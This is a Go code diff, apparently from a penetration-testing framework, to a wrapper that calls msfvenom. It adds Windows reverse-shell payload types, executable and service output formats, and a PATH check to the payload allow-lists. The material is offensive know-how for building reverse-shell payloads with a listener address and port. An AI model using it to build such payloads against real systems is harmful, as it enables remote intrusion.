@@ -59,6 +59,9 @@ var (
 			"meterpreter/reverse_tcp":   true,
 			"meterpreter/reverse_http":  true,
 			"meterpreter/reverse_https": true,
+			"custom/reverse_winhttp":    true,
+			"custom/reverse_winhttps":   true,
+			"custom/reverse_tcp":        true,
 		},
 		"linux": {
 			"meterpreter_reverse_http":  true,
@@ -78,6 +81,8 @@ var (
 		"csharp":        true,
 		"dw":            true,
 		"dword":         true,
+		"exe":           true,
+		"exe-service":   true,
 		"hex":           true,
 		"java":          true,
 		"js_be":         true,
@@ -120,7 +125,10 @@ func Version() (string, error) {
 
 // VenomPayload - Generates an MSFVenom payload
 func VenomPayload(config VenomConfig) ([]byte, error) {
-
+	// Check if msfvenom is in the path
+	if _, err := exec.LookPath(venomBin); err != nil {
+		return nil, fmt.Errorf("msfvenom not found in PATH")
+	}
 	// OS
 	if _, ok := validPayloads[config.Os]; !ok {
 		return nil, fmt.Errorf(fmt.Sprintf("Invalid operating system: %s", config.Os))
@@ -161,7 +169,7 @@ func VenomPayload(config VenomConfig) ([]byte, error) {
 		"--payload", payload,
 		fmt.Sprintf("LHOST=%s", config.LHost),
 		fmt.Sprintf("LPORT=%d", config.LPort),
-		fmt.Sprintf("EXITFUNC=thread"),
+		"EXITFUNC=thread",
 	}
 
 	if luri != "" {
@@ -194,10 +202,10 @@ func VenomPayload(config VenomConfig) ([]byte, error) {
 func venomCmd(args []string) ([]byte, error) {
 	msfLog.Printf("%s %v", venomBin, args)
 	cmd := exec.Command(venomBin, args...)
-	var stdout bytes.Buffer
-	var stderr bytes.Buffer
-	cmd.Stdout = &stdout
-	cmd.Stderr = &stderr
+	stdout := new(bytes.Buffer)
+	stderr := new(bytes.Buffer)
+	cmd.Stdout = stdout
+	cmd.Stderr = stderr
 	err := cmd.Run()
 	msfLog.Println(cmd.String())
 	if err != nil {
@@ -212,10 +220,10 @@ func venomCmd(args []string) ([]byte, error) {
 // consoleCmd - Execute a msfvenom command
 func consoleCmd(args []string) ([]byte, error) {
 	cmd := exec.Command(consoleBin, args...)
-	var stdout bytes.Buffer
-	var stderr bytes.Buffer
-	cmd.Stdout = &stdout
-	cmd.Stderr = &stderr
+	stdout := new(bytes.Buffer)
+	stderr := new(bytes.Buffer)
+	cmd.Stdout = stdout
+	cmd.Stderr = stderr
 	err := cmd.Run()
 	if err != nil {
 		msfLog.Printf("--- stdout ---\n%s\n", stdout.String())
